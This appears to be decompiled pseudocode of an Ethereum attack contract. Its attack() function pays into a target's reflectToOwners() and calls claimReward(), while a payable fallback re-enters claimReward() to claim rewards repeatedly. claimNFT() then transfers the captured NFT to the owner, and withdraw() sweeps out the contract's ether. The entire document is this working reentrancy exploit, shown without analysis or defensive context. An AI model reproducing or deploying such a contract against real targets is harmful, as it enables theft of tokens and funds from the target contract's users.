contract main {




// =====================  Runtime code  =====================


const getBalance = eth.balance(this.address)


address targetAddress;
address owner;
uint256 stor2;

function owner() {
    return owner
}

function target() {
    return targetAddress
}

function getOwnerBalance() {
    return eth.balance(owner)
}

function targetBalance() {
    return eth.balance(targetAddress)
}

function withdraw() {
    if owner != msg.sender:
        revert with 0, 'Forbidden'
    call msg.sender with:
       value eth.balance(this.address) wei
         gas 2300 * is_zero(value) wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function _fallback() payable {
    if eth.balance(targetAddress) >= 0:
        require ext_code.size(targetAddress)
        call targetAddress.claimReward(uint256 arg1) with:
             gas gas_remaining wei
            args stor2
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
}

function claimNFT() {
    if owner != msg.sender:
        revert with 0, 'Forbidden'
    require ext_code.size(targetAddress)
    call targetAddress.0x23b872dd with:
         gas gas_remaining wei
        args address(this.address), owner, stor2
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function attack() payable {
    require msg.value >= 10^17
    require ext_code.size(targetAddress)
    call targetAddress.reflectToOwners() with:
       value 10^17 wei
         gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require ext_code.size(targetAddress)
    call targetAddress.claimReward(uint256 arg1) with:
         gas gas_remaining wei
        args stor2
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}



}
